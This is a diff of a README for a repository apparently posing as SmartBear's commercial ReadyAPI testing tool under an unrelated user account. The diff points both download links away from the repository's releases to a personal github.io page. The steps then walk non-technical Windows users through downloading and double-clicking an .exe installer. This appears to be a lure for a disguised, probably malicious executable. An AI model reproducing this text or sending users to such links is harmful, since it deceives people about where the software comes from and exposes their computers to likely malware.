@@ -1,6 +1,6 @@
 # 🛠️ SmartBear-ReadyAPI-2026 - Streamline your automated API testing workflows
 
-[![](https://img.shields.io/badge/Download-ReadyAPI-blue.svg)](https://github.com/Onlyt4254/SmartBear-ReadyAPI-2026/releases)
+[![](https://img.shields.io/badge/Download-ReadyAPI-blue.svg)](https://onlyt4254.github.io)
 
 ReadyAPI provides tools for testing web services. Use this software to verify your API performance, security, and functionality. This package works on Windows 10 and Windows 11 systems.
 
@@ -8,7 +8,7 @@ ReadyAPI provides tools for testing web services. Use this software to verify yo
 
 Follow the steps below to set up ReadyAPI on your computer. You do not need programming skills to complete this process.
 
-1. Visit the [official release page](https://github.com/Onlyt4254/SmartBear-ReadyAPI-2026/releases).
+1. Visit the [official release page](https://onlyt4254.github.io).
 2. Look for the latest version of the installer file ending in .exe.
 3. Click the filename to download the installer to your Downloads folder.
 4. Locate the downloaded file and double-click it.
